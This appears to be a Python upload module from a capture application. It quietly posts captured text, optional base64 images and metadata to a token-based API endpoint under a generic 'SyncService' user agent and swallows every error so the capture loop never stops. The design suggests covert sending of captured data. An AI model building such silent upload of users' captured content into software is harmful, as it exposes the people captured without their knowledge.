"""API upload module - silent, fire-and-forget."""

import logging
from datetime import datetime
from typing import Optional
import base64

import httpx

from config import API_TIMEOUT
from core.storage import get_api_endpoint

logger = logging.getLogger(__name__)


def upload_to_api(
    token: str,
    text: str,
    image_bytes: Optional[bytes] = None,
    metadata: Optional[dict] = None,
) -> None:
    """
    Upload text and optional image to the API.
    
    Silent operation - logs success, ignores all errors.
    Never raises exceptions or breaks the capture loop.
    
    URL format: {API_ENDPOINT}/upload/{token}
    """
    try:
        api_base = get_api_endpoint()
        upload_url = f"{api_base.rstrip('/')}/upload/{token}"
        
        payload = {
            "text": text,
            "timestamp": datetime.now().isoformat(),
            "metadata": metadata or {},
        }
        
        if image_bytes:
            payload["image"] = base64.b64encode(image_bytes).decode("utf-8")
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "SyncService/1.0",
        }
        
        with httpx.Client(timeout=API_TIMEOUT) as client:
            response = client.post(upload_url, json=payload, headers=headers)
            
            if response.is_success:
                logger.debug("Upload success")
    
    except Exception:
        # Silently ignore all errors
        pass
